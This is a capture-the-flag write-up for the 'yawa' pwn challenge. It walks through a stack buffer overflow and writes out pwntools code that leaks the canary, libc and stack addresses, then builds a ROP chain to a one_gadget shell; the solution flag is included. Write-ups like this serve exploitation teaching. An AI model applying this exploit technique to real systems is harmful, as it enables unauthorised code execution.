# yawa \[109 Points] (184 Solves)
```
Yet another welcome application.
```
Attached are [4 files](./attachment)

---

## Writeup

The source code is pretty minimal
```c
int menu() {
    int choice;
    puts("1. Tell me your name");
    puts("2. Get a personalised greeting");
    printf("> ");
    scanf("%d", &choice);
    return choice;
}

int main() {
    init();

    char name[88];
    int choice;

    while(1) {
        choice = menu();
        if(choice == 1) {
            read(0, name, 0x88);
        } else if(choice == 2) {
            printf("Hello, %s\n", name);
        } else {
            break;
        }
    }
}
```

The first thing that jumps is
```c
read(0, name, 0x88);
```
We are reading 0x88 (136) bytes into name, but name's size is only 88 bytes!

Wait, let's run checksec
```
$ checksec yawa
[*] './yawa'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```
Ok, there's canary, and it's 64 bit so we can't brute force it (about 2**56 options to guess). \
If we can't guess it, can we leak it? What our other options in the program? \
We can print our name!
```c
printf("Hello, %s\n", name);
```
Because there's nothing in the `read` before to put a null byte in the end of the buffer,
and now we are printing it until the null byte, so **if we write just enough data**,
_we can leak the canary!_

Let's write some utility functions
```py
def set_name(name):
    io.sendlineafter(b"> ", b"1")
    if len(name) >= 0x88:
        io.send(name[:0x88])
    else:
        io.sendline(name)
def get_name():
    io.sendlineafter(b"> ", b"2")
    io.recvuntil(b"Hello, ")
    return io.recvuntil(b"\n1. Tell me your name", drop=True)
def stop():
    io.sendlineafter(b"> ", b"3")
```

And now a function to leak an address on the stack after our name.
```py
def leak_idx(idx, size):
    set_name(cyclic(idx-1))
    leak = get_name()[idx:idx+size]

    if len(leak) != size:
        log.warn(f"len(leak) != size: {len(leak)} != {size}")

    return leak
```
First **we set the name to a string of the length of the we want to leak minus 1**. \
*We subtract 1 because that's the index we wanna leak, so if we would to overwrite it,
we wouldn't be able to read it's value.* \
Then to **actually leak it**, we run `get_name`, and take **only the relevant part**. \
_There's also a check to warn us in case our leak isn't actually of the correct size.
This might happen if there's a null byte in the data we are leaking_

### Leaking the canary
The least significant byte (the first in the memory) of the canary is always `\x00` to prevent it's leakage via printing \
Luckly, we can just overwrite this byte, get the following 7 bytes, and then add it back.
```py
canary = u64(b"\x00" + leak_idx(88+1, 7))
log.success("canary leak: {}".format(hex(canary)))
```

Ok, so now we have the canary, and we can do ROP! \
I decided to use one_gadget, and for it we will have to leak libc, for which we
use the same technique. \
Where can we find a libc address? The C `main` function is called from inside
`libc`, so if we get it, we can leak libc.
```py
libc_leak = u64(leak_idx(88+16,8).ljust(8, b"\x00"))
libc.address = libc_leak - 0x29d90
log.success("libc addr: {}".format(hex(libc.address)))
```
The address has a `\x00` in the most significant bytes, so if we receive less, we
just pad with zeros.

Ok, now let's run `one_gadget` against the provided libc
```c
0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

Running in gdb we notice that `rax` is already `NULL`, so we just need to satisfy the `rbp` constraint. \
For that we also need to leak ASLR, for which we just find a stack address with gdb
```py
aslr = u64(leak_idx(88+48,8).ljust(8, b"\x00"))
log.success("aslr leak: {}".format(hex(aslr)))
```

And now finally use everything we leaked to make a rop chain and run it
```py
one_gadget = 0xebd43
rop = ROP(exe)
rop.raw(libc.address + 0x2a2e0)     # pop rbp
rop.raw(aslr-248+0x70)              # Offset such that [rbp-0x70] == 0 (one_gadget constraint)
rop.raw(libc.address + one_gadget)  # one_gadget
rop.raw(0)                          # This is the 0 rbp will use

set_name(fit({
    88: canary,
    88+16: rop.chain()
}))

stop()
```

Final [solve.py](./solve.py)

Success!

**Flag:** `DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}`
